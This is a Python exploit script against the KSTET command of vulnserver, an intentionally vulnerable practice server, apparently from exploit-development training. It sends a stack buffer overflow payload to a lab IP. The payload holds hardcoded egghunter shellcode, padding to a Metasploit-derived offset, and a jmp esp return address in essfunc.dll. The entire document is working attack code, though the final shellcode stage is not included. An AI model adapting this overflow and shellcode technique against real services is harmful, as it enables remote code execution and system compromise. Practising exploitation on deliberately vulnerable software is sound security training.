#!/usr/bin/env python

from socket import socket, AF_INET, SOCK_STREAM, timeout, error
from struct import pack
from sys import exit

rhost = "172.16.153.130"
rport = 9999
target = (rhost, rport)

egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 41326341
# [*] Exact match at offset 66
expected_payload_len = 1000 + 10  # 10 for the KSTET /.:/
payload = "KSTET /.:/"
payload += "A" * 12
payload += egghunter
payload += "A" * (66 - len(egghunter) - 12)
# Message=  0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (\\vmware-host\Shared Folders\SharedWithVM\vulnerable-apps\vulnserver\essfunc.dll)
payload += pack("<L", 0x62501203)
payload += "A" * 4
payload += "\x71\xBA\x71\xBA"
payload += "C" * (930 - 8)

if len(payload) != expected_payload_len:
    print('[!] Payload length is {x}, expected {y}'.format(x=len(payload), y=expected_payload_len))
    exit(1)

if __name__ == '__main__':
    print('[*] connecting to remote host')
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect(target)
        print('[*] receiving the welcome message')
        welcome = s.recv(1024)
        print('[*] received the following message:\n\t{msg}'.format(msg=welcome))
        s.send(payload)
        print('[*] B00M! ph33r')
    except timeout:
        print('[!] Timed out waiting for the server. Is it paused in the debugger?')
    except error:
        print('[!] A socket error occurred. Is the server running')
